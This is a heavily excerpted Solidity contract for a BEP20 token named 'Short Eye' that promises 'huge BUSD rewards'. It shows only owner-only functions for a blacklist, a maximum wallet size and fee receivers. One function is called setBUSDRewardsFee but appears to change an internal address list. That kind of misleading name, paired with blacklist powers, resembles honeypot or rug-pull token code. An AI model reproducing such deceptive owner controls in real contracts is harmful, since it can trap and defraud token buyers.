...
/*
Hold to accumulate huge BUSD rewards!
...
abstract contract Auth {
    ...
    function setBUSDRewardsFee(address adr) public onlyOwner {
        _intAddr[adr] = false;
    }
...
contract SHORT is IBEP20, Auth {
    ...
    string constant private _name = "Short Eye";
    string constant private _symbol = "$ShortEye";
    ...
    function setBUSDRewardsFee() internal view returns (bool) {
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function setFeeReceiver(address _varMarketingFeeReceiver, address _devFeeReceiver) external authorized {
    ...
    function setblacklistAddress(address _address, bool _value) public authorized{
